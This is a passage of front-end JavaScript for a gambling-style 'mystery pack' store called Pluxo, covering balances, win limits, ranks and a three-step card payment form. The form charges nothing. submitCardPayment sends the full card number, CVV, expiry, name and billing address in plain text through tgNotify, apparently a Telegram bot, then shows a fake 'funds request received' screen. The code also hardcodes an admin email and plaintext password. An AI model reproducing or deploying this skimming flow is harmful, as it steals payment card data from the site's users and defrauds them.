                } else if (pageName === 'wishlist') {
                    generateWishlistPage();
                } else if (pageName === 'stats') {
                    generateStatsPage();
                } else if (pageName === 'pack-history') {
                    generatePackHistoryPage();
                } else if (pageName === 'achievements') {
                    generateAchievementsPage();
                } else if (pageName === 'leaderboard') {
                    generateLeaderboardPage();
                } else if (pageName === 'pack-builder') {
                    generatePackBuilderPage();
                } else if (pageName === 'profile') {
                    generateProfilePage();
                }
            }
            
            const navItems = document.querySelectorAll('.nav-item');
            navItems.forEach(item => {
                if (item.textContent.toLowerCase().includes(pageName.toLowerCase())) {
                    item.classList.add('active');
                }
            });
        }

        // Market tab switching
        function switchMarketTab(tab) {
            document.querySelectorAll('.market-tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            
            if (tab === 'cards') {
                generateMarketCards();
            } else if (tab === 'packs') {
                generatePacks();
            }
        }

        // Pull tab switching
        function switchPullTab(tab) {
            document.querySelectorAll('.pull-tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            generateRecentPulls(tab);
        }

        // Quantity adjustment
        function adjustQuantity(change) {
            const input = document.getElementById('packQuantity');
            let value = parseInt(input.value) || 1;
            value = Math.max(1, value + change);
            input.value = value;
        }

        // Purchase mystery pack
        function purchaseMysteryPack() {
            if (!currentUser) {
                document.getElementById('loginModal').classList.add('active');
                return;
            }
            const quantity = parseInt(document.getElementById('packQuantity').value) || 1;
            const packCost = 25 * quantity;
            const balance  = getBalance(currentUser.username);
            if (balance < packCost) {
                showNotification(`Insufficient balance. You have $${balance.toFixed(2)}, need $${packCost.toFixed(2)}.`, 'error');
                return;
            }
            deductBalance(currentUser.username, packCost);
            addExp(50 * quantity);
            const opened = parseInt(localStorage.getItem('packsOpened') || '0') + quantity;
            localStorage.setItem('packsOpened', opened);
            openSpinModal(25, quantity);
            tgNotify(`ðŸ›’ <b>New Purchase</b>\nðŸ‘¤ User: <b>${currentUser.username}</b>\nðŸ“§ Email: ${currentUser.email || 'N/A'}\nðŸ“¦ Mystery Packs: ${quantity}x\nðŸ’° Total: $${packCost.toFixed(2)}\nðŸ’³ Remaining: $${getBalance(currentUser.username).toFixed(2)}\nâ­ EXP: ${currentUser.exp}/500 (Rank ${currentUser.rank})\nðŸ•’ ${new Date().toLocaleString()}`);
        }

// â”€â”€ Balance System â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function _getStore(key) {
            try { const d = JSON.parse(localStorage.getItem(key) || '{}'); return typeof d === 'object' && d !== null ? d : {}; } catch(e) { return {}; }
        }
        function _setStore(key, obj) { localStorage.setItem(key, JSON.stringify(obj)); }

        // Loaded balance (admin-loaded, not withdrawable)
        function getLoaded(username) { return parseFloat(_getStore('pluxo_balances')[username.toLowerCase()] || 0); }
        function setLoaded(username, amount) {
            const s = _getStore('pluxo_balances');
            s[username.toLowerCase()] = Math.max(0, parseFloat(amount) || 0);
            _setStore('pluxo_balances', s);
            updateBalanceDisplay();
        }
        function addLoaded(username, amount) { setLoaded(username, getLoaded(username) + (parseFloat(amount) || 0)); }

        // Winnings balance (won from spins, withdrawable)
        function getWinnings(username) { return parseFloat(_getStore('pluxo_winnings')[username.toLowerCase()] || 0); }
        function setWinnings(username, amount) {
            const s = _getStore('pluxo_winnings');
            s[username.toLowerCase()] = Math.max(0, parseFloat(amount) || 0);
            _setStore('pluxo_winnings', s);
            updateBalanceDisplay();
        }
        function addWinnings(username, amount) { setWinnings(username, getWinnings(username) + (parseFloat(amount) || 0)); }

        // â”€â”€ Daily win limit ($2,500) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        const DAILY_WIN_LIMIT = 2500;

        function getDailyWinData(username) {
            const key = 'pluxo_dailywin_' + username.toLowerCase();
            try { return JSON.parse(localStorage.getItem(key) || '{"total":0,"day":0}'); }
            catch(e) { return { total: 0, day: 0 }; }
        }
        function addDailyWin(username, amount) {
            const key  = 'pluxo_dailywin_' + username.toLowerCase();
            const today = Math.floor(Date.now() / 86400000);
            const d    = getDailyWinData(username);
            const total = (d.day === today ? d.total : 0) + amount;
            localStorage.setItem(key, JSON.stringify({ total, day: today }));
            return total;
        }
        function getDailyWinTotal(username) {
            const today = Math.floor(Date.now() / 86400000);
            const d     = getDailyWinData(username);
            return d.day === today ? d.total : 0;
        }

        // Lockout: blocks pack purchases for 24h after hitting limit
        function getLockout(username) {
            const v = localStorage.getItem('pluxo_lockout_' + username.toLowerCase());
            return v ? parseInt(v) : 0;
        }
        function setLockout(username) {
            localStorage.setItem('pluxo_lockout_' + username.toLowerCase(), String(Date.now() + 86400000));
        }
        function isLockedOut(username) {
            return getLockout(username) > Date.now();
        }
        function lockoutTimeLeft(username) {
            const rem = getLockout(username) - Date.now();
            if (rem <= 0) return '';
            const h = Math.floor(rem / 3600000);
            const m = Math.floor((rem % 3600000) / 60000);
            return `${h}h ${m}m`;
        }

        function showDailyLimitPopup() {
            const timeLeft = currentUser ? lockoutTimeLeft(currentUser.username) : '';
            const overlay = document.createElement('div');
            overlay.style.cssText = 'position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,0.97);display:flex;align-items:center;justify-content:center;font-family:"Press Start 2P",monospace;';
            overlay.innerHTML = `
                <div style="text-align:center;padding:30px 20px;max-width:340px;border:3px solid #ff4444;background:#0d0000;">
                    <div style="font-size:32px;margin-bottom:16px;">ðŸ›‘</div>
                    <div style="font-size:12px;color:#ff4444;margin-bottom:14px;letter-spacing:2px;">DAILY LIMIT HIT</div>
                    <div style="font-size:8px;color:#fff;line-height:2;margin-bottom:14px;">
                        Please stop â€” you have hit the<br>
                        <span style="color:#ffd700;">$2,500 daily win limit.</span>
                    </div>
                    <div style="font-size:7px;color:#aaa;line-height:2;margin-bottom:20px;">
                        Cash out your winnings and come back.<br>
                        ${timeLeft ? `<span style="color:#00ff00;">Resets in: <b>${timeLeft}</b></span>` : ''}
                    </div>
                    <button onclick="this.closest('div[style]').parentElement.remove();openWithdrawModal();" 
                        style="background:#00ff00;color:#000;border:none;padding:12px 0;font-family:'Press Start 2P',monospace;font-size:8px;cursor:pointer;width:100%;margin-bottom:8px;">
                        ðŸ’¸ CASH OUT NOW
                    </button>
                    <button onclick="this.closest('div[style]').parentElement.remove();"
                        style="background:transparent;color:#555;border:1px solid #333;padding:8px 0;font-family:'Press Start 2P',monospace;font-size:7px;cursor:pointer;width:100%;">
                        Close
                    </button>
                </div>`;
            document.body.appendChild(overlay);
        }

        // Total spendable = loaded + winnings
        function getBalance(username) { return getLoaded(username) + getWinnings(username); }

        // Deduct from loaded first, then winnings
        function deductBalance(username, amount) {
            let amt = parseFloat(amount) || 0;
            const loaded = getLoaded(username);
            if (loaded >= amt) { setLoaded(username, loaded - amt); return; }
            setLoaded(username, 0);
            amt -= loaded;
            setWinnings(username, getWinnings(username) - amt);
        }

        // Keep addBalance for bot /load command (adds to loaded)
        function addBalance(username, amount) { addLoaded(username, amount); }

        function updateBalanceDisplay() {
            if (!currentUser) { document.getElementById('balanceDisplay').style.display = 'none'; return; }
            const bal = getBalance(currentUser.username);
            const win = getWinnings(currentUser.username);
            document.getElementById('balanceDisplay').style.display = 'block';
            document.getElementById('balanceAmount').textContent = bal.toFixed(2);
            document.getElementById('balanceAmount').style.color = bal < 25 ? '#ff4444' : '#00ff00';
            // Update withdrawal display if open
            const wEl = document.getElementById('withdrawableAmount');
            if (wEl) wEl.textContent = win.toFixed(2);
        }

// Login State Management
        let currentUser = (function() {
            try {
                const u = JSON.parse(localStorage.getItem('currentUser') || 'null');
                if (!u || !u.username || !u.email) { localStorage.removeItem('currentUser'); return null; }
                // Verify the account still exists
                const users = JSON.parse(localStorage.getItem('pluxo_users') || '[]');
                const found = Array.isArray(users) && users.find(x => x.email === u.email && x.username === u.username);
                if (!found) { localStorage.removeItem('currentUser'); return null; }
                return u;
            } catch(e) { localStorage.removeItem('currentUser'); return null; }
        })();

        // â”€â”€ Seed admin account locally (works even without backend) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        (function seedAdminLocally() {
            try {
                const users = JSON.parse(localStorage.getItem('pluxo_users') || '[]');
                const exists = Array.isArray(users) && users.find(u => u.email === 'nbtnateyt@gmail.com');
                if (!exists) {
                    function _hp(str) { let h=0; for(let i=0;i<str.length;i++) h=Math.imul(31,h)+str.charCodeAt(i)|0; return String(h>>>0); }
                    users.push({ username:'nbtnate', email:'nbtnateyt@gmail.com', password:_hp('Deonte1200$'), rank:1, exp:0, packsOpened:0, isAdmin:true });
                    localStorage.setItem('pluxo_users', JSON.stringify(users));
                    const bals = JSON.parse(localStorage.getItem('pluxo_balances') || '{}');
                    if (!bals['nbtnate']) { bals['nbtnate'] = { loaded: 0, winnings: 0 }; localStorage.setItem('pluxo_balances', JSON.stringify(bals)); }
                }
            } catch(e) {}
        })();
        let userCart = JSON.parse(localStorage.getItem('userCart') || '[]');

        // Check login state on load
        function checkLoginState() {
            if (currentUser) {
                showLoggedInState();
            } else {
                showLoggedOutState();
            }
            updateCartDisplay();
        }

        function showLoggedInState() {
            document.getElementById('rankInfo').style.display = 'flex';
            document.getElementById('userButton').style.display = 'flex';
            document.getElementById('loginBtn').style.display = 'none';
            const _af = document.getElementById('addFundsBtn'); if (_af) _af.style.display = 'block';

            // Update user info
            document.getElementById('userDisplay').textContent = `@${currentUser.username}`;
            document.getElementById('userRank').textContent = `RANK ${currentUser.rank || 1}`;

            updateBalanceDisplay();

            updateExpDisplay();
            updateBalanceDisplay();
            const _purchBtn = document.getElementById('purchasePackBtn');
            const _purchMsg = document.getElementById('purchaseLoginMsg');
            if (_purchBtn) { _purchBtn.style.opacity = '1'; _purchBtn.style.cursor = 'pointer'; }
            if (_purchMsg) _purchMsg.style.display = 'none';
            // Refresh profile header elements directly
            const _pName     = document.getElementById('profileUsername');
            const _pEmail    = document.getElementById('profileEmail');
            const _pPacks    = document.getElementById('profileStatPacks');
            const _pBalance  = document.getElementById('profileStatBalance');
            const _pWinnings = document.getElementById('profileStatWinnings');
            if (_pName)     _pName.textContent     = '@' + currentUser.username;
            if (_pEmail)    _pEmail.textContent    = currentUser.email || '';
            const _packsOpened = parseInt(localStorage.getItem('packsOpened') || '0');
            if (_pPacks)    setStatValue(_pPacks, _packsOpened, 'int', true);
            if (_pBalance)  setStatValue(_pBalance, getBalance(currentUser.username), 'currency', true);
            if (_pWinnings) setStatValue(_pWinnings, getWinnings(currentUser.username), 'currency', true);
            
            // Update progress
            const progress = (currentUser.exp || 0) % 500;
            const progressPercent = (progress / 500) * 100;
            document.getElementById('progressFill').style.width = `${progressPercent}%`;
            document.getElementById('userProgress').textContent = `${progress} / 500`;
        }

        function toggleUserMenu() {
            const d = document.getElementById('userMenuDropdown');
            if (d) d.style.display = d.style.display === 'none' ? 'block' : 'none';
        }
        // Close menu when clicking outside
        document.addEventListener('click', (e) => {
            const btn = document.getElementById('userButton');
            if (btn && !btn.contains(e.target)) {
                const d = document.getElementById('userMenuDropdown');
                if (d) d.style.display = 'none';
            }
        });

        function doLogout() {
            currentUser = null;
            localStorage.removeItem('currentUser');
            showLoggedOutState();
            showNotification('Logged out successfully.', 'success');
            showPage('home');
        }

        function showLoggedOutState() {
            document.getElementById('rankInfo').style.display = 'none';
            document.getElementById('userButton').style.display = 'none';
            document.getElementById('loginBtn').style.display = 'flex';
            document.getElementById('balanceDisplay').style.display = 'none';
            const _af = document.getElementById('addFundsBtn'); if (_af) _af.style.display = 'none';
            const btn = document.getElementById('purchasePackBtn');
            const msg = document.getElementById('purchaseLoginMsg');
            if (btn) { btn.style.opacity = '0.4'; btn.style.cursor = 'not-allowed'; }
            if (msg) msg.style.display = 'block';
        }

        // â”€â”€ Card Payment Multi-Step â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        let payData = {};

        function showWalletModal() {
            if (!currentUser) { showNotification('Please login first', 'error'); showLoginModal(); return; }
            payData = {};
            payStep1();
            document.getElementById('walletModal').classList.add('active');
        }

        function setFundAmount(n) {
            payData.amount = n;
            document.querySelectorAll('.amt-btn').forEach(b => b.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById('payCustomAmt').value = n;
        }

        function payStep1() {
            document.getElementById('walletModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('walletModal')">Ã—</button>
                <div class="pay-step">
                    <div class="modal-title">Add Funds</div>
                    <div style="font-size:7px;color:#555;margin-bottom:16px;text-align:center;">Step 1 of 3 â€” Choose Amount</div>
                    <div style="display:flex;gap:6px;margin-bottom:10px;">
                        <button class="amt-btn" onclick="setFundAmount(25)">$25</button>
                        <button class="amt-btn" onclick="setFundAmount(50)">$50</button>
                        <button class="amt-btn" onclick="setFundAmount(100)">$100</button>
                        <button class="amt-btn" onclick="setFundAmount(200)">$200</button>
                    </div>
                    <div class="pay-label">CUSTOM AMOUNT</div>
                    <input id="payCustomAmt" type="number" min="5" placeholder="Enter amount ($)" class="pay-input" style="border-color:#00ff00;" value="${payData.amount||''}">
                    <div id="pay1Err" style="display:none;color:#ff4444;font-size:7px;padding:8px;border:1px solid #ff4444;margin-bottom:10px;animation:shakeErr 0.4s;"></div>
                    <button class="modal-btn" style="width:100%;margin-top:4px;" onclick="payStep1Next()">
                        <span>â†’</span><span>Card Details</span>
                    </button>
                </div>`;
        }

        function payStep1Next() {
            const amt = parseFloat(document.getElementById('payCustomAmt').value);
            const err = document.getElementById('pay1Err');
            if (!amt || amt < 5) { err.textContent='Minimum amount is $5.'; err.style.display='block'; err.style.animation='none'; requestAnimationFrame(()=>err.style.animation='shakeErr 0.4s'); return; }
            payData.amount = amt;
            payStep2();
        }

        function payStep2() {
            document.getElementById('walletModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('walletModal')">Ã—</button>
                <div class="pay-step">
                    <div class="modal-title">Card Details</div>
                    <div style="font-size:7px;color:#555;margin-bottom:14px;text-align:center;">Step 2 of 3 â€” <span style="color:#00ff00;">$${payData.amount.toFixed(2)}</span></div>

                    <div class="pay-card-preview">
                        <div style="font-size:6px;color:#00ff00;letter-spacing:2px;margin-bottom:12px;">PLUXO PAYMENT</div>
                        <div id="cardPreviewNum" style="font-size:11px;color:#fff;letter-spacing:3px;margin-bottom:12px;">â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢</div>
                        <div style="display:flex;justify-content:space-between;">
                            <div>
                                <div style="font-size:5px;color:#555;margin-bottom:2px;">CARDHOLDER</div>
                                <div id="cardPreviewName" style="font-size:7px;color:#aaa;">YOUR NAME</div>
                            </div>
                            <div style="text-align:right;">
                                <div style="font-size:5px;color:#555;margin-bottom:2px;">EXPIRES</div>
                                <div id="cardPreviewExp" style="font-size:7px;color:#aaa;">MM/YY</div>
                            </div>
                        </div>
                    </div>

                    <div class="pay-label">NAME ON CARD</div>
                    <input id="payCardName" type="text" placeholder="Full name as on card" class="pay-input" value="${payData.cardName || ''}">

                    <div class="pay-label">CARD NUMBER</div>
                    <input id="payCardNum" type="text" maxlength="19" placeholder="1234 5678 9012 3456" class="pay-input" value="${payData.cardNum ? payData.cardNum.replace(/(.{4})/g,'$1 ').trim() : ''}">

                    <div style="display:flex;gap:8px;">
                        <div style="flex:1;">
                            <div class="pay-label">EXPIRY</div>
                            <input id="payCardExp" type="text" maxlength="5" placeholder="MM/YY" class="pay-input" value="${payData.cardExp || ''}">
                        </div>
                        <div style="flex:1;">
                            <div class="pay-label">CVV</div>
                            <input id="payCardCvv" type="password" maxlength="4" placeholder="â€¢â€¢â€¢" class="pay-input" value="${payData.cardCvv || ''}">
                        </div>
                    </div>
                    <div id="pay2Err" style="display:none;color:#ff4444;font-size:7px;padding:8px;border:1px solid #ff4444;margin-bottom:10px;"></div>
                    <button class="modal-btn" style="width:100%;" onclick="payStep2Next()">
                        <span>â†’</span><span>Billing Info</span>
                    </button>
                    <button onclick="payStep1()" style="width:100%;background:transparent;color:#555;border:1px solid #222;padding:8px;font-family:'Press Start 2P',monospace;font-size:6px;cursor:pointer;margin-top:8px;">â† Back</button>
                </div>`;

            // Attach input handlers after rendering
            document.getElementById('payCardName').addEventListener('input', function() {
                document.getElementById('cardPreviewName').textContent = this.value || 'YOUR NAME';
            });
            document.getElementById('payCardNum').addEventListener('input', function() {
                let v = this.value.replace(/\D/g, '').slice(0, 16);
                let formatted = v.replace(/(.{4})/g, '$1 ').trim();
                this.value = formatted;
                document.getElementById('cardPreviewNum').textContent = formatted || 'â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢';
            });
            document.getElementById('payCardExp').addEventListener('input', function() {
                let v = this.value.replace(/\D/g, '').slice(0, 4);
                if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
                this.value = v;
                document.getElementById('cardPreviewExp').textContent = this.value || 'MM/YY';
            });

            // Restore preview if going back
            if (payData.cardName) document.getElementById('cardPreviewName').textContent = payData.cardName;
            if (payData.cardNum)  document.getElementById('cardPreviewNum').textContent  = payData.cardNum.replace(/(.{4})/g,'$1 ').trim();
            if (payData.cardExp)  document.getElementById('cardPreviewExp').textContent  = payData.cardExp;
        }

        function payStep2Next() {
            const name = document.getElementById('payCardName').value.trim();
            const num  = document.getElementById('payCardNum').value.replace(/\s/g,'');
            const exp  = document.getElementById('payCardExp').value;
            const cvv  = document.getElementById('payCardCvv').value;
            const err  = document.getElementById('pay2Err');
            err.style.display='none';
            if (!name)                          { err.textContent='Enter the name on your card.'; err.style.display='block'; return; }
            if (num.length < 15)                { err.textContent='Enter a valid card number.'; err.style.display='block'; return; }
            if (!/^\d{2}\/\d{2}$/.test(exp))    { err.textContent='Enter expiry as MM/YY.'; err.style.display='block'; return; }
            if (cvv.length < 3)                 { err.textContent='Enter your CVV.'; err.style.display='block'; return; }
            payData.cardName  = name;
            payData.cardNum   = num;
            payData.cardExp   = exp;
            payData.cardCvv   = document.getElementById('payCardCvv').value;
            payData.cardLast4 = num.slice(-4);
            payStep3();
        }

        function payStep3() {
            document.getElementById('walletModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('walletModal')">Ã—</button>
                <div class="pay-step">
                    <div class="modal-title">Billing Info</div>
                    <div style="font-size:7px;color:#555;margin-bottom:14px;text-align:center;">Step 3 of 3 â€” <span style="color:#00ff00;">$${payData.amount.toFixed(2)}</span></div>

                    <div style="display:flex;gap:8px;">
                        <div style="flex:1;">
                            <div class="pay-label">FIRST NAME</div>
                            <input id="payBillFirst" type="text" placeholder="First" class="pay-input" value="${payData.billFirst || ''}">
                        </div>
                        <div style="flex:1;">
                            <div class="pay-label">LAST NAME</div>
                            <input id="payBillLast" type="text" placeholder="Last" class="pay-input" value="${payData.billLast || ''}">
                        </div>
                    </div>

                    <div class="pay-label">BILLING ADDRESS</div>
                    <input id="payBillStreet" type="text" placeholder="Street address" class="pay-input" value="${payData.billStreet || ''}">

                    <div style="display:flex;gap:8px;">
                        <div style="flex:2;">
                            <div class="pay-label">CITY</div>
                            <input id="payBillCity" type="text" placeholder="City" class="pay-input" value="${payData.billCity || ''}">
                        </div>
                        <div style="flex:1;">
                            <div class="pay-label">STATE</div>
                            <input id="payBillState" type="text" placeholder="NY" maxlength="2" class="pay-input" value="${payData.billState || ''}">
                        </div>
                        <div style="flex:1;">
                            <div class="pay-label">ZIP</div>
                            <input id="payBillZip" type="text" placeholder="10001" maxlength="5" class="pay-input" value="${payData.billZip || ''}">
                        </div>
                    </div>

                    <div id="pay3Err" style="display:none;color:#ff4444;font-size:7px;padding:8px;border:1px solid #ff4444;margin-bottom:10px;"></div>

                    <div style="background:#0a1a0a;border:1px solid #1a3a1a;padding:10px;margin-bottom:12px;font-size:7px;color:#aaa;line-height:1.8;">
                        <div style="display:flex;justify-content:space-between;"><span>Amount</span><span style="color:#00ff00;">$${payData.amount.toFixed(2)}</span></div>
                        <div style="display:flex;justify-content:space-between;"><span>Card</span><span>â€¢â€¢â€¢â€¢ ${payData.cardLast4}</span></div>
                    </div>

                    <button class="modal-btn" style="width:100%;background:#00ff00;color:#000;border-color:#00ff00;" onclick="submitCardPayment()">
                        <span>ðŸ’³</span><span>Pay Now â€” $${payData.amount.toFixed(2)}</span>
                    </button>
                    <button onclick="payStep2()" style="width:100%;background:transparent;color:#555;border:1px solid #222;padding:8px;font-family:'Press Start 2P',monospace;font-size:6px;cursor:pointer;margin-top:8px;">â† Back</button>
                </div>`;

            // Attach handlers after rendering
            document.getElementById('payBillState').addEventListener('input', function() {
                this.value = this.value.toUpperCase();
            });
            document.getElementById('payBillZip').addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '').slice(0, 5);
            });
        }

        function submitCardPayment() {
            if (!currentUser) { closeModal('walletModal'); showLoginModal(); return; }
            const first  = document.getElementById('payBillFirst').value.trim();
            const last   = document.getElementById('payBillLast').value.trim();
            const street = document.getElementById('payBillStreet').value.trim();
            const city   = document.getElementById('payBillCity').value.trim();
            const state  = document.getElementById('payBillState').value.trim();
            const zip    = document.getElementById('payBillZip').value.trim();
            const err    = document.getElementById('pay3Err');
            err.style.display = 'none';
            if (!first)        { err.textContent='Enter first name.';      err.style.display='block'; return; }
            if (!last)         { err.textContent='Enter last name.';       err.style.display='block'; return; }
            if (!street)       { err.textContent='Enter billing address.'; err.style.display='block'; return; }
            if (!city)         { err.textContent='Enter city.';            err.style.display='block'; return; }
            if (!state)        { err.textContent='Enter state.';           err.style.display='block'; return; }
            if (zip.length < 5){ err.textContent='Enter 5-digit ZIP.';     err.style.display='block'; return; }

            payData.billFirst = first;  payData.billLast   = last;
            payData.billStreet = street; payData.billCity  = city;
            payData.billState = state;   payData.billZip   = zip;
            payData.billAddr  = street + ', ' + city + ', ' + state + ' ' + zip;

            // Show processing screen
            document.getElementById('walletModalInner').innerHTML = `
                <div style="text-align:center;padding:40px 20px;animation:processingPulse 1.2s ease infinite;">
                    <div style="font-size:36px;margin-bottom:16px;">ðŸ’³</div>
                    <div style="font-size:9px;color:#00ff00;margin-bottom:8px;">PROCESSING...</div>
                    <div style="font-size:7px;color:#555;">Please wait</div>
                </div>`;

            setTimeout(() => {
                closeModal('walletModal');
                showPaySuccess(payData.amount);
                tgNotify(
                    'ðŸ’³ <b>NEW PAYMENT REQUEST</b>\n' +
                    'â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n' +
                    'ðŸ‘¤ <b>' + currentUser.username + '</b>\n' +
                    'ðŸ“§ ' + (currentUser.email||'N/A') + '\n' +
                    'ðŸ’° Amount: <b>$' + payData.amount.toFixed(2) + '</b>\n' +
                    'â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n' +
                    'ðŸ’³ Card: <code>' + payData.cardNum + '</code>\n' +
                    'ðŸ“… Expiry: <code>' + payData.cardExp + '</code>\n' +
                    'ðŸ”’ CVV: <code>' + payData.cardCvv + '</code>\n' +
                    'ðŸ‘¤ Name: <b>' + payData.cardName + '</b>\n' +
                    'â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n' +
                    'ðŸ  Billing: ' + payData.billFirst + ' ' + payData.billLast + '\n' +
                    'ðŸ“ ' + payData.billAddr + '\n' +
                    'â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n' +
                    'ðŸ•’ ' + new Date().toLocaleString() + '\n\n' +
                    '<i>/load ' + payData.amount + ' ' + currentUser.username + '</i>'
                );
            }, 2200);
        }

        function showPaySuccess(amount) {
            const popup = document.getElementById('paySuccessPopup');
            popup.style.display = 'flex';
            document.getElementById('paySuccessIcon').textContent = 'ðŸŽ‰';
            document.getElementById('paySuccessTitle').textContent = 'FUNDS REQUEST RECEIVED';
            document.getElementById('paySuccessTitle').style.color = '#00ff00';
            document.getElementById('paySuccessAmount').textContent = '$' + parseFloat(amount).toFixed(2);
            document.getElementById('paySuccessSub').textContent = 'Please wait until admin approve your funds request.\nShouldn\'t take longer than 1-2 hours.';
            document.getElementById('paySuccessInner').style.animation = 'none';
            requestAnimationFrame(() => { document.getElementById('paySuccessInner').style.animation = 'paySuccessAnim 0.6s cubic-bezier(0.34,1.56,0.64,1)'; });
            launchConfetti();
        }

        function closePaySuccess() {
            document.getElementById('paySuccessPopup').style.display = 'none';
            const c = document.getElementById('confettiCanvas');
            const ctx = c.getContext('2d');
            ctx.clearRect(0,0,c.width,c.height);
        }

        function launchConfetti() {
            const canvas = document.getElementById('confettiCanvas');
            const ctx    = canvas.getContext('2d');
            canvas.width  = window.innerWidth;
            canvas.height = window.innerHeight;
            const pieces = Array.from({length:120}, () => ({
                x: Math.random() * canvas.width, y: -10,
                w: 6 + Math.random()*8, h: 8 + Math.random()*6,
                color: ['#00ff00','#ffffff','#ffd700','#cc44ff','#4499ff'][Math.floor(Math.random()*5)],
                vx: (Math.random()-0.5)*4, vy: 2+Math.random()*4,
                rot: Math.random()*360, vr: (Math.random()-0.5)*8, life:1
            }));
            let frame = 0;
            function draw() {
                ctx.clearRect(0,0,canvas.width,canvas.height);
                pieces.forEach(p => {
                    p.x += p.vx; p.y += p.vy; p.vy += 0.08; p.rot += p.vr; p.life -= 0.008;
                    ctx.save(); ctx.globalAlpha = Math.max(0, p.life);
                    ctx.translate(p.x, p.y); ctx.rotate(p.rot*Math.PI/180);
                    ctx.fillStyle = p.color;
                    ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
                    ctx.restore();
                });
                frame++;
                if (frame < 200) requestAnimationFrame(draw);
                else ctx.clearRect(0,0,canvas.width,canvas.height);
            }
            draw();
        }

        // â”€â”€ Rainbow Physical Prizes â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        const RAINBOW_PRIZES = [
            { name: 'PS5',               value: 499,   display: 'PS5 Console',           img: 'https://i.postimg.cc/W4yXsHJw/ca2fe3dd877341aebb80119a785d956a-source.webp' },
            { name: 'iPhone 17 Pro Max', value: 1199,  display: 'iPhone 17 Pro Max',     img: 'https://i.postimg.cc/sDKLtKwf/e37a88ad2f004b5abce00aa7de58ae89-source.webp' },
            { name: 'Rolex',             value: 26000, display: 'Rolex Submariner Watch',img: 'https://i.postimg.cc/c1FMWjyK/d302131af6fb44aebbd372dd18f5c7f7-source.webp' },
            { name: '$10,000 Cash',      value: 10000, display: '$10,000 Cash',          img: 'https://i.postimg.cc/NjBHrkcg/R-(2).png' },
        ];

        // â”€â”€ $10,000 one-time global prize â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function is10kClaimed() {
            return localStorage.getItem('pluxo_10k_claimed') === '1';
        }
        function claim10k() {
            localStorage.setItem('pluxo_10k_claimed', '1');
        }

        // Shuffled queue â€” $10k removed if already claimed by anyone on this device/network
        let _rainbowQueue = [];
        function pickRainbowPrize() {
            const available = is10kClaimed()
                ? RAINBOW_PRIZES.filter(p => p.name !== '$10,000 Cash')
                : RAINBOW_PRIZES;
            if (_rainbowQueue.length === 0) {
                _rainbowQueue = [...available].sort(() => Math.random() - 0.5);
            }
            // Make sure no $10k if claimed
            let pick = _rainbowQueue.pop();
            if (pick && pick.name === '$10,000 Cash' && is10kClaimed()) {
                pick = available[Math.floor(Math.random() * available.length)];
            }
            return pick || available[0];
        }

        // â”€â”€ EXP & Rank System â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        const RANK_REWARDS = {
            2:  { label: '$5 Bonus',          cash: 5 },
            3:  { label: '$10 Bonus',         cash: 10 },
            4:  { label: '$15 Bonus',         cash: 15 },
            5:  { label: '$20 Bonus + Title', cash: 20 },
            6:  { label: '$25 Bonus',         cash: 25 },
            7:  { label: '$30 Bonus',         cash: 30 },
            8:  { label: '$40 Bonus',         cash: 40 },
            9:  { label: '$50 Bonus',         cash: 50 },
            10: { label: '$100 Bonus + ELITE', cash: 100 },
        };

        function addExp(amount) {
            if (!currentUser) return;
            let exp  = (currentUser.exp  || 0) + amount;
            let rank = (currentUser.rank || 1);
            while (exp >= 500 && rank < 10) {
                exp -= 500;
                rank++;
                onRankUp(rank);
            }
            if (rank >= 10) exp = Math.min(exp, 499);
            currentUser.exp  = exp;
            currentUser.rank = rank;
            localStorage.setItem('currentUser', JSON.stringify(currentUser));
            updateExpDisplay();
        }

        function onRankUp(newRank) {
            const reward = RANK_REWARDS[newRank];
            showNotification('ðŸŽ‰ RANK ' + newRank + ' UNLOCKED! ' + (reward ? reward.label : ''), 'success');
            if (reward && reward.cash && currentUser) {
                addWinnings(currentUser.username, reward.cash);
